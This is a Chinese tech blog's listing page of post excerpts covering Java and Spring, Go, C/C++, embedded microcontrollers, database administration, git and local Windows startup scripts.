而且第一版博客我并没有照着开源项目的SpringBoot架构写，而是用SSM头铁做的（就是为了感受一下XML配Bean，更深入的了解Spring），中间出现了很多版本兼容的问题。
二、正式开发 2.1 看懂项目并模仿 真正进入了开发阶段，第一步大家应该都知道，就是先从GitHub上Clone下来人家的项目，跑一跑，确定能跑通之后，再照猫画虎地模仿。
这一时期大概花费了我五天左右，才搞清楚了人家的项目究竟是怎么一回事，技术点究竟有哪些。毕竟大家都是这样过来的，欲增加自己的功能，必先知道人家究竟是怎么跑的。
想学会跑，必先学会走，必须懂得循序渐进的道理，才能走的更远。
2.2 正式动手敲之前，内化成自己的项目，对其设计并架构 前面我已经介绍过，我所借鉴的两个开源项目之间并不互通。根据MVC架构的原则(什么是MVC架构，我之前博客有写)，所以要自己设计从View层到Controller层之间的桥梁，也就是俗称的接口，是一种对接前后端的规范。然而Model层如何与Controller层交互的方法以及业务层和持久层的对接，开源项目中设计的极为巧妙，我也从中获取到了很多知识，并真切的感受到了Spring为我们带来的解耦。
后来添加新功能时，我也遵循着已经架构好的模式，自顶向下的进行开发。（此处有争议，为什么自顶向下，是因为我自己一人写了全栈，自顶向下我可以根据前端需要的数据，一步一步的添加方法，一直走到Dao层访问数据库。）具体实际开发是前后端分离的，可能我自己这种开发模式不是很科学，但是前后端都是我写的，规矩自然我来定。
下面放出几张我当时设计好的设计图：
后台管理功能：
前台展示功能：
2.3 动手编写 到这一步就开始愉快的敲代码了，按照之前的设计，一个一个功能去实现。期间遇到了很多的问题，但是这一时期也是我进步最快最大的时期，我也在此期间总结出了很多技术博客。
下面将一一介绍编写博客过程中踩过的坑。
三、博客功能展示 前台的页面显示大家都能在我的网站中看到。下面就说一下大家看不到的地方以及后台管理的部分功能好了：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30c446c984e9093b2533ec77967c6cf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b18d63c0923ac90832f330ef6f572e7e/" rel="bookmark">
			关于vscode的使用心得与遇到的问题记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你可以永远喜欢VScode 1.gcc与g++命令的区别 对于 C 语言程序的编译，我们应该使用 gcc 指令，而编译 C++ 程序则推荐使用 g++ 指令，这就足够了。 gcc和g++是什么，有什么区别？ (biancheng.net)
2.Module containing this breakpoint has not yet loaded or the breakpoint address could not be obtained. 修改工作区下的launch.json和tasks.json文件 3.关于我的配置文件 launch.json { // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ { "name": "g++.exe - 生成和调试活动文件", "type": "cppdbg", "request": "launch", "program": "${fileDirname}\\${fileBasenameNoExtension}.exe", "args": [], "stopAtEntry": false, "cwd": "${fileDirname}", "environment": [], "externalConsole": true,//像devc++那样的外部窗口 "MIMode": "gdb", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b18d63c0923ac90832f330ef6f572e7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4278beb90ba79559ce1c368df34ae6bd/" rel="bookmark">
			golang 时间格式化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		科普 CST 含义 CST: 中部标准时间 (Central Standard Time) 同时表示下面4个时区
CST Central Standard Time(USA) UT-6:00 CST Central Standard Time(Australia) UT 9:30 CST China Standard Time UT 8:00 CST Cuba Standard Time UT-4:0
我们常遇到的应该就是 China Standard Time.
GMT 和 UTC 的关系 UTC (Universal Time Coordinated), 以子午初线(经度0)上的评价太阳时为依据, 也就是英国伦敦的平均太阳时
GMT (Greenwitch Mean Time) 格林威治平均时间, 由于地球绕太阳的运行的轨道是椭圆, 导致 UTC 表示的时间, 不是很准确, 因此提出了 GMT 时间, 每年或者2年对 UTC 增加一个闰秒, 来完成修正. 一般上我们可以认为 GMT 和 UTC 是一样的.
golang 的时间 认准 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4278beb90ba79559ce1c368df34ae6bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d775772fcea9a4b5aa8ce4846723908/" rel="bookmark">
			本地启动mysql,redis,oracle的window10脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		E: cd E:\softWare\redis redis-server redis.windows.conf echo redis start OK,this window will closed by 5 seconds ! ping 127.1 -n 6 &gt;nul @echo off %1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&amp;&amp;exit cd /d "%~dp0" net start mysql @echo off %1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&amp;&amp;exit cd /d "%~dp0" net start OracleOraDb11g_home1TNSListener net start OracleServiceORCL pause 文件路径不一样，看着改就行了，mysql前三行是获取管理员权限
新建文档.txt 改成.bat格式就行了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/208fbbe56248db134998a78fd3f73167/" rel="bookmark">
			雪花Id(snowflake)主键(Long) ，前端丢失精度原理及解决之道
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、案例场景
2、雪花(snowflake)Id,Long id前端精度损失原因
3、解决JavaScript Number长整型精度丢失问题
4、成果展现 ​
5、总结
6、参考文章
1、案例场景 我们项目之中可能大多数都使用自增长id作为主键id，这样对于中小型系统来说一般没有啥问题。但是随着各种业务发展以及后续可能分库分表情况；我们有些项目或者项目之中的独立微服务可能使用的是雪花算法生成的主键id(19位)长整型的。于是最近我们在项目对接其他微服务(使用的雪花主键id)之后，在前端调用接口之后发现返回结果id被裁减了。经过组内同事定位📌Long型精度损失。具体原因下面原理部分分析。
2、雪花(snowflake)Id,Long id前端精度损失原因 本人试验以及结合网上的文章，发现一个问题，在PostMan里面请求接口能够完全正确的返回雪花算法生成的主键id，但是在Swagger或者前端接口请求 浏览器之中就会出现雪花算法精度损失问题。于是查找原因如下：
JavaScript 不支持后台返回的 Long 类型，JavaScript 的 number 类型的数值范围是 -2^53~2^53（不包含边界） 所以大于 9007199254740991 的数，进制转换会存在精度问题，而雪花ID生成的数值过大，导致 JavaScript 不能正常存储导致。
同时注意：建议雪花ID在数据库中使用 bigint 来存储，而不是使用 varchar；这样可以提高这样数据库的速度，使用索引的时候少一步字符串转换成数字的操作。
于是我的实际项目之中返回的雪花算法的主键id JavaScript的Number最大id9007199254740991项目主键id1511972392982179840浏览器或者swagger返回1511972392982179800 于是就出现了 前端传递的id，找寻不到对应的记录问题。 3、解决JavaScript Number长整型精度丢失问题 解决方案1 使用Jackson注解，我们也可以用@JsonFormat做类型转换 在VO类中，id上添加注释 @ApiModelProperty(name = "id", value = "消息id") @JsonProperty("id") //此句为问题关键 相当于吧Long转换为String @JsonFormat(shape = JsonFormat.Shape.STRING) @JSONField(serializeUsing = ToStringSerializer.class) //此处标识得在序列化的时候转换为字符串 private Long id; 其他相关：
@JSONField(serializeUsing= ToStringSerializer.class) 这个注解是Fastjson的，旨在让系统系列化时，保留相关精度。 解决方案2
写一个 JSON 配置类，将 Long 类型序列化成 JSON 的时候自动转为 String 类型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/208fbbe56248db134998a78fd3f73167/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/498255674688927a4495d8188fe99663/" rel="bookmark">
			Oracle Data Guard和金仓KingbaseES集群的数据保护模式对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Oracle Data Guard的三种数据保护模式 根据不同的场景需求，Oracle Data Guard 提供三种数据保护模式（Data Protection Mode ）：最大可用性、最大性能和最大保护。
Maximum Availability（最大可用性） 这种保护模式可提供最高级别的数据保护，而不会影响主数据库的可用性。最大可用性模式下，事物提交需要等到恢复这些事务所需的所有重做数据都已写入在线重做日志并且完成如下步骤之一（基于用户配置）：
备库已收到redo日志，备库redo日志的刷盘I/O 已启动，并将确认信息发送回主
备库已接收并在磁盘写入redo日志，并将确认信息发送回主
如果主数据库没有收到来自至少一个同步备用数据库的确认，那么它就像处于最高性能模式一样运行以保持主数据库的可用性，直到它再次能够将其重做流写入同步备用数据库。
如果主数据库出现故障，则此模式可确保不会发生数据丢失，前提是 Oracle Data Guard 配置中至少有一个同步备用数据库。
一旦 Oracle Data Guard 将重做数据写入备用重做日志文件中的持久存储，主数据库上的事务就被视为受到保护。一旦完成，确认会迅速返回到主数据库，以便它可以继续进行下一个事务。这最大限度地减少了同步传输对主数据库吞吐量和响应时间的影响。要充分受益于备用数据库上完整的 Oracle Data Guard 验证，请确保在实时应用模式下运行，以便在收到重做更改后尽快将其应用到备用数据库。Oracle Data Guard 会向检测到的任何损坏发出信号，以便立即采取纠正措施。
最大可用性模式下的性能与保护
使用最大可用性模式时，需要了解LOG_ARCHIVE_DEST_n属性的SYNC/AFFIRM与SYNC/ NOAFFIRM(FastSync) 两种模式。
当使用SYNC/AFFIRM执行传输时，主数据库执行写操作并等待确认redo日志已同步传输到物理备用数据库并写入磁盘。性能代价为需要完成redo日志的I/O。
当使用SYNC/NOAFFIRM执行传输时，主节点执行写操作并仅等待确认数据已在备用节点上接收到，而不是已写入磁盘。
举个栗子：
假定主节点遇到灾难性故障，同时备用站点断电，在这种情况下：
SYNC/AFFIRM，数据已经写入备库磁盘，不会丢失数据，在系统恢复时，数据将在备库磁盘上可用。
在SYNC/NOAFFIRM，没有检查数据已写入备库磁盘的情况下，可能会丢失一些数据。
Maximum Performance（最大性能） 这种保护模式可提供最高级别的数据保护，而不会影响主数据库的性能。这是通过允许事务redo日志在写入在线日志后立即提交来实现的。redo日志也会写入一个或多个备用数据库，但这与事务提交是异步完成的，因此主数据库性能不受传输redo日志和从备用数据库接收确认消息所需时间的影响。
此保护模式提供的数据保护比最大可用性模式略少，并且对主数据库性能的影响最小。
这是Oracle默认的保护模式。
Maximum Protection（最大保护） 最大保护类似于最大可用性，但在发生多个故障事件时提供额外级别的数据保护。与允许主数据库在无法从备用数据库接收确认时继续处理的最大可用性不同，最大保护会关闭主数据库而不是允许它继续处理不受保护的事务。
由于这种数据保护模式将数据保护优先于主库可用性，因此Oracle建议至少使用两个备库来保护以最大保护模式运行的主库，以防止单个备库故障导致主库关闭。
Oracle如何配置数据保护模式
执行以下步骤设置主数据库的数据保护模式：
1、选择满足您的可用性、性能和数据保护要求的数据保护模式。
2、验证至少一个备用数据库满足所需数据保护模式的redo日志传输要求。
3、验证DB_UNIQUE_NAME数据库初始化参数是否已在主数据库和每个备用数据库上设置为唯一值。
4、验证是否LOG_ARCHIVE_CONFIG已在主数据库和每个备用数据库上定义了数据库初始化参数，并且其值包括一个包含主数据库和每个备用数据库的DB_UNIQUE_NAME的DG_CONFIG列表。
以下示例 SQL 语句配置LOG_ARCHIVE_CONFIG参数：
SQL&gt; ALTER SYSTEM SET LOG_ARCHIVE_CONFIG=‘DG_CONFIG=(CHICAGO,BOSTON)’;
5、通过在主数据库上执行以下 SQL 语句来设置数据保护模式：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/498255674688927a4495d8188fe99663/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a95ce573343c0d4c3a0d75b75ed16cd/" rel="bookmark">
			51单片机（入门保姆级教程）——点亮一个LED灯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、为什么要学习单片机？ 作为一名工科学生，进入大学参加各种活动，例如：电子设计大赛、寻迹车比赛、LED电子灯比赛以及各种各样的微控、弱控强电路等，都离不开单片机的身影。电路、c语言、数电、模电、计算机控制等知识的学习，给单片机的学习增添了软辅助，但我认为，学习单片机更多的是自己的兴趣、爱好，正如“程序虐我千百遍，我视程序为初恋”。
此外，学习单片机知识，从最基础的51单片机入门学习，可以为我们后面学习STM32、ARM微控器等其微控制器的学习奠定知识基础和积攒一定的经验，给自己的大学及以后的职业道路增加一丝色彩。
二、首先了解什么是单片机？ 单片机又称单片微控制器，把一整个计算机系统集成到一个芯片上，当于一个微型的计算机，和计算机相比，单片机只缺少了I/O设备。一块芯片就成了一台计算机。体积小、质量轻、价格便宜、为学习、应用和开发提供了便利条件。
单片机属于一种集成式电路芯片。主要包含CPU、只读存储器ROM和随机存储器RAM、时钟电路、中断系统和定时/计数器及各种输入输出IO口构成，多样化数据采集与控制系统能够让单片机完成各项复杂的运算，无论是对运算符号进行控制，还是对系统下达运算指令都能通过单片机完成。
图1 单片机的基本结构
三、如何快速、高效学习单片机？ 多学习；查阅原始资料，即单片机手册和各个模块手册。多动手；代码的学习主要是自己多动手进行练习，孰能生巧。多思考；一个程序的实现往往有多种不同的方式，但最基本的原理保持不变，只是每个程序员的习惯和书写形式不一，复杂程度和代码的可移植性不一样，万变不离其原理。 四、准备资料和软件（提前了解，间接性、针对性学习印象比较深刻） 4.1 相关基础知识 单板的基本知识、电路的基本电路知识、数字电子技术基础知识、模拟电子技术基础知识、选用模块的逻辑知识、电力电子知识（模块化弱控强应用电路后buck、boost电路等）
4.2 基础软件 推荐keil5： 编写程序代码proteus模拟仿真： 可以进行模型构建及仿真演示，为实物排除问题Altium Designer： 进行原理图绘制，设计自己专属的pcb板STC-ISP： 将keil5生成的Hex文件烧录进单片机内B站：可以在上面进行部分程序的学习 五、（最基础、最简单程序）点亮一个LED灯 5.1 LED原理和知识 图2 LED原理图
LED即发光二极管，是一种半导体固体发光器件。具有单向导通性，两极分别为P极和N极，也有说成是阳极和阴极，如图2中阳极接电源端，只需阴极给低电平LED就会发光。（其余LED知识大家可自行了解）
5.2 点亮一个LED灯具体代码 #include &lt;reg52.h&gt; //此文件定义单片机的一些特殊功能寄存器 sbit led=P2^0;	//将单片机的P2.0端口定义为led（当然也可以定义其他端口，欢迎尝试） void main() //每一个main.c中必须包含一个主函数，程序从这里开始执行 { while(1) //while死循环，程序将在这里进行不断重读执行 { led=0;	//P2.0端口设置为低电平，根据二极管原理点亮LED灯	}	} 注：其中对应行都有注释，大家移植后可以删除
5.3 包含/区分/学习知识点 int main和void main的区别（掌握） 有一定c语言知识的同学应该知道int是需要返回的，在单片机里也一样。
void main没有返回值，int main有返回值（即return 0）。
C51中的一些程序扩充定义（了解） （1）sfr：特殊功能寄存器。
sfr 变量名=地址值（现在已经平时不用我们自己去定义寄存器的名字，因为在reg52.H这个头文件里面都帮我们定义好了）
（2） sbit：特殊功能位声明
sbit 变量名=地址值；在给某个引脚取名的时候经常会用到。如上面对LED管脚的定义sbit led=P2^0。
（3）bit：位变量声明
bit 用来定义位数据变量，由它定义的变量数据仅为1位，只有0或1两种状态，长度为1字节。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a95ce573343c0d4c3a0d75b75ed16cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35ebf428fa813eae5badfdf7b0bf5dd8/" rel="bookmark">
			feign自定义ErrorDecoder 错误时返回统一的错误对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		曾经的接口开发，大家都习惯返回200状态码，然后在响应体中使用以下形式
{ code:200 data:{ key:value } msg:msg } 如果我们想让异常情况下，y也返回json对象，怎么实现呢
{ error_code:200 message:message } 这时候正常和异常返回不同对象，在feign中就需要不同的处理。
做法就是使用自定义的ErrorDecoder，在返回码不是2XX会进入这个处理流程
@FeignClient(name = "hello", configuration = [Configuration::class]) ....... open class ExceptionErrorDecoder(private var objectMapper: ObjectMapper = ObjectMapper()) : ErrorDecoder { private val logger = LoggerFactory.getLogger(ExceptionErrorDecoder::class.java) override fun decode(s: String, response: Response): Exception { val reader = response.body().asReader() val body = Util.toString(reader) logger.info("feign接口url:${response.request().url()},body:$body") val javaType = objectMapper.typeFactory.constructParametricType(Map::class.java, String::class.java, String::class.java) try { val map: Map&lt;String, String&gt; = objectMapper.readValue(body, javaType) return CommonException(map.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35ebf428fa813eae5badfdf7b0bf5dd8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60a69ac1cdac748c2eccfff266ce1c0d/" rel="bookmark">
			信息学奥赛一本通（C&#43;&#43; 版）（1-2-1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2064：【例2.1】交换值 #include &lt;bits/stdc++.h&gt; using namespace std; int main() { int a,b; cin&gt;&gt;a&gt;&gt;b; cout&lt;&lt;b&lt;&lt;" "&lt;&lt;a; return 0; } 2065：【例2.2】整数的和 #include &lt;bits/stdc++.h&gt; using namespace std; int main() { int a,b,c; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; cout&lt;&lt;a+b+c; return 0; } 2066：【例2.3】买图书 #include &lt;bits/stdc++.h&gt; using namespace std; int main() { int n,m; cin&gt;&gt;n&gt;&gt;m; printf("%.2lf",n-(m*80.0/100)*1.0); return 0; } 1006：A+B问题 #include &lt;bits/stdc++.h&gt; using namespace std; int main() { int a,b; cin&gt;&gt;a&gt;&gt;b; cout&lt;&lt;a+b; return 0; } 1007：计算(a+b)×c的值 #include &lt;bits/stdc++.h&gt; using namespace std; int main() { int a,b,c; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; cout&lt;&lt;(a+b)*c; return 0; } 1008：计算(a+b)/c的值 #include &lt;bits/stdc++.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60a69ac1cdac748c2eccfff266ce1c0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/132843ea4340b5adf7ca79c0861a3280/" rel="bookmark">
			14-【go】Go中time.Parse()和time.ParseInLocation()的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Golang time.Parse和time.Format的时区问题_HelloHello-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5091a87fad9754ee0bf243e114c0602/" rel="bookmark">
			信息系统项目管理师必背知识点（完整版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		科科过小编为您整理信息系统项目管理师必背知识点完整版，背完至少+10分！
信息系统生命周期:
4大——立项、开发、运维、消亡
5小-——
系统规划(初步调查、可行性研究)
系统分析(详细调查、逻辑设计)
系统设计(总体/概要设计、详细设计)
系统实施(编程调试、系统转换)
系统运维(系统维护、系统评价)
OSI协议：应表会传网链物
安全保护能力等级：用系安结访(个人-企业-地方-国家-国防)
网页防篡改：十千出驴(时间轮询、核心内嵌、事件触发、文件过滤驱动)
工程监理：四控(投资、进度、质量、变更)三管(合同、信息、安全)一协调(沟通)
软件维护分类：就是鱼丸(纠错性、适应性、预防性、完善性)
敏捷项目管理：狗腿叹世界(构造、推测、探索、适应、结束) CMMI阶段式表示法1-5级：初管定量优(初始、已管理、已定义、已量化管理、持续优化)
CMMI连续式表示法0-3级：完形管定(不完整、已执行、已管理、已定义)
质量特性：533244功能靠用小护翼(功能性、可靠性、可用性、效率、可维护性、可移植性)
质量子特性:
是准用一安(适用性、准确性、互用性、依从性、安全性)
错复成(容错性、可恢复性、成熟性)
学姐操(易学性、可理解性、可操作性)
石源(时间特性、资源特性)
试改定分(可测试性、可修改性、稳定性、可分析性)
应装一替(适应性、易安装性、一致性、可替换性)
1直交4个女朋友10分雷人(直流12、交流42防雷102)
一、项目整体管理
1项目章程的内容:
项目目的或批准目的的原因
可测量的项目目标和相关成功标准项目总体要求概括的项目描述项目主要风险
总体里程碑进度计划总体预算
项目审批要求(用什么标准评价项目成功，由谁对项目成功下结论，由谁来签署项目结束)
委派的项目经理及其职责和职权
发起人或其他批准项目章程的人员的姓名与职权。
2项目管理计划的内容:
项目管理团队选择的各个项目管理过程每一选定过程的实施水平
对实施这些过程时使用的工具和技术所做的说明
在管理具体项目中使用选定过程的方式和方法，包括过程之间的依赖关系和相互作用，以及重要的依据和成果
为了实现项目目标所执行工作的方式、方法监控变更的方式、方法
实施配置管理的方式、方法
使用实施效果测量基准并使之保持完整的方式、方法项目干系人之间的沟通需要和技术
选定的项目生命周期和多个阶段项目的项目阶段
高层管理人员为了加快解决未解决的问题和处理未做出的决策，对内容、范围和时间安排的关键审查。
3.制定项目计划的问题:
项目计划不应该由一个人制定，应有项目组参与:
项目计划缺少相关分计划，如沟通计划、质量计划等;项目计划缺少评审和审批环节:
没有处理好外部因素和内部因素带来的风险，缺乏有效的应对措施;
项目发生变更时没有及时更新项目计划:
4.项目编写计划工作流程:
明确目标
成立初步的项目团队工作准备和信息收集
依照模板、标准编写初步的概要的项目计划
把上述计划纳入项目计划，然后对项目计划进行综合平衡项目经理负责编写项目计划评审与批准项目计划
获得批准后项目计划就是项目的基准计划
二、项目范围管理
1.项目范围说明书的内容:
产品范围描述、验收标准、可交付成果、项目的除外责任、制约因素、假设条件
2.WBS分解步骤:
识别:识别和分析可交付成果及相关工作:
构造;确定WBS的结构和编排方法;
分解:自上而下逐层细化分解:
分配代码:为WBS组建制定和分配表示编码
核实确认:核实可交付成果分解的程度是恰当的。
3.定义:
规划范围管理:编制范围管理计划，书面描述如何定义、确认和控制项目范围的过程，在整个项目中如何管理范围提供指南和方向。
三、项目进度管理
1.缩短活动的工期方法:
赶工，投入更多的资源或增加工作时间，以缩短关键活动的工期;
快速跟进，并行施工，以缩短关键路径的长度;使用高素质的资源或经验更丰富的人员;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5091a87fad9754ee0bf243e114c0602/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55aacbd49acfeb4a3fc219eae785fe73/" rel="bookmark">
			树莓派如何查看CPU和内存占用率
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		命令行里输入： htop
图形显示，4个CPU内核的占用率和内存使用率一目了然，各个进程也有详细参数显示，还可以鼠标点击排序：
CPU温度查看：
命令行里输入：vcgencmd measure_temp
或安装工具sensors，用命令sensors查看
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b4152860755b66e1a1d8767f9d195dd/" rel="bookmark">
			python 多线程内子线程结束后执行主线程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python 多线程内子线程结束后执行主线程 今天写case时发现一个场景，请求助力接口后需要统计被助力用户的助力次数 助力接口用线程并发的方式进行，代码如下 def test_case_08(self): """多用户并发助力""" t1 = [threading.Thread(target=PreheatMethod().help, args=(i, self.A, 1)) for i in self.uid_list] [i.start() for i in t1] response = PreheatMethod().init(self.A) print(f"当前用户被助力次数 :{response['data']['userInfo']['helpedCount']}次") 线程这里采用列表推导式进行uid列表循环制作线程
t1 = [threading.Thread(target=PreheatMethod().help, args=(i, self.A, 1)) for i in self.uid_list] 发现的问题就是，子线程进行第一个线程i.start()时就会直接执行下面的PreheatMethod().init(self.A)方法这样就没发起到统计的作用了
解决方法：添加[j.join() for j in t1]进行子线程阻塞
def test_case_08(self): """多用户并发助力""" t1 = [threading.Thread(target=PreheatMethod().help, args=(i, self.A, 1)) for i in self.uid_list] [i.start() for i in t1] [j.join() for j in t1] response = PreheatMethod().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b4152860755b66e1a1d8767f9d195dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3821b575378ecb5cf08fa705f3d6bb85/" rel="bookmark">
			STM32F1xx --GPIO 八种工作模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.STM32F1xx GPIO八种模式
1.一般输入模式:(1)上拉输入，(2)下拉输入，(3)浮空输入。 2.模拟模式：(4)模拟输入
3.输出模式:(5)开漏输出，(6)推挽输出
4.复用模式:(7)复用推挽，(8)复用开漏
------------------------------------------------IO基本结构图-------------------------------------------------------------- ------------------------------------------------end----------------------------------------------------------------------------
2.详细讲解各种模式工作情况：
-------------------------------------1.一般输入模式下 IO结构图如下-------------------------------------------------
1.一般输入：
(1)输出驱动器被禁止。
(2)施密特触发器打开。
(3)根据输入配置(下拉，上拉，浮动)的不同，弱上拉和弱下拉被断开或连接。
(4)出现的IO引进上的数据在每个APB2时钟被采用到输入数据寄存器。
(5)对输入数据寄存器读访问可得到IO状态。 ------------------------------------------------end----------------------------------------------------------------------------
-------------------------------------2.模拟输入模式下 IO结构图如下-------------------------------------------------
2.模拟输入
(1)输出驱动器被禁止
(2)施密特触发器关闭，施密特触发输出值为0,输入数据寄存器被读取时一直为0
(3)弱上拉和下拉被禁止 ------------------------------------------------end---------------------------------------------------------------------------
-------------------------------------3.输出模式下 IO结构图如下-------------------------------------------------------
3.输出模式：
(1)输出驱动器激活,施密特触发器激活。
(2)开漏模式：输出数据寄存器上的0 可以导通N-MOS管从而输出低电平，输出数据寄存器上的1 使禁止N-MOS 从而输出高阻态（开漏跟P-MOS无关）
(3)推挽输出：输出数据寄存器0时导通N-MOS 从而输出低电平，1时导通P-MOS管输出高电平
(4)上拉和下拉被禁止
(5)可读取输入数据寄存器知道IO管脚的状态
(6)在推挽模式下，可读取 输出数据寄存器从而获取最后一次写入的数据。
(7)在每一个apb2时钟周期，出现在io引脚的数据会被采样到输入数据寄存器中。
------------------------------------------------end---------------------------------------------------------------------------
-------------------------------------4.复用模式下 IO结构图如下-------------------------------------------------------
4.复用模式
(1)跟输出模式相比较 输出信号来源于外设，不是io引脚口了。这时必须让相应外设使能起来。
(2)其它跟 输出模式一样。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35915fdd6a708c2672a93311f9b53899/" rel="bookmark">
			图形讲解git使用教程（附PDF下载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载地址：图形讲解git使用教程PDF版下载
图形讲解git使用教程 一、开发1. 安装git.exe2. 生成SSH公钥4. 设置用户名，邮箱5. 设置GitLab密钥6. 提交代码到GitLab7. 常用操作1. 还原修改2. 部分commit后push失败1. 保留本地修改2. 放弃本地修改，直接覆盖之 二、测试三、发布1. 分支发布2. 主干发布 四、使用场景1. 已经commit，返回上一版本2. 又不想还原了3. 恢复工作区修改的文件4. 已经add到暂存区需要还原5. 删除文件6. 误删工作区文件7. 分支 ✉️ mengfanding@aliyun.com ⏲ 2019年3月8日
一、开发 1. 安装git.exe git官网 下载对应版本，并安装
2. 生成SSH公钥 打开【Git bash here】
$ cd ~/.ssh 首次安装会出现找不到目录，跳过
bash: cd: /c/Users/aa/.ssh: No such file or directory
$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/c/Users/aa/.ssh/id_rsa): Created directory '/c/Users/aa/.ssh'. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /c/Users/aa/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35915fdd6a708c2672a93311f9b53899/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33215bbbeb9bdfda4e5f95591ce493bd/" rel="bookmark">
			openwrt默认应用源码路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		openwrt默认应用源码路径
sdk/open-sdk/mtk/prebuilt/openwrt-dl
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e0f9c6b79456d02a0d8977e78293602/" rel="bookmark">
			js高级笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 概述
1.1 面向对象介绍
2 ES6中的类和对象
2.1 面向对象思维特点
2.2 对象
2.3 类class
2.4 创建类 2.5 类的继承
2.5.1 类的继承语法规范
2.5.2 super关键字
2.5.3 this的指向问题
2.6 添加新元素新方法
3 js注意点和补充
4 构造函数和原型
4.1 概述
4.2 构造函数
4.2.1 静态成员和实例成员
4.3 构造函数原型prototype
4.4 对象原型__proto__（两边是两个下划线）
4.5 原型constructor
4.6 构造函数、实例、原型对象三者之间的关系
4.7 原型链
4.8 原型对象中this的指向
4.9 扩展内置对象
5 继承
5.1 call（）
5.2 利用构造函数继承父类型中的属性
6 类的本质
7 数组的迭代和遍历方法
7.1 数组方法
7.1.1 forEach（）
7.1.2 filter（）
7.1.3 some（）查找元素中是否有满足条件的元素
7.1.4 forEach和som的区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e0f9c6b79456d02a0d8977e78293602/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/469d1ac6e44c0456fbb241e3a0fca5d5/" rel="bookmark">
			.gitignore文件用法及如何配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		.gitignore文件用法如何配置(笔记) .gitignore文件是在git提交的时候用来屏蔽某些你不想提交上去的文件。
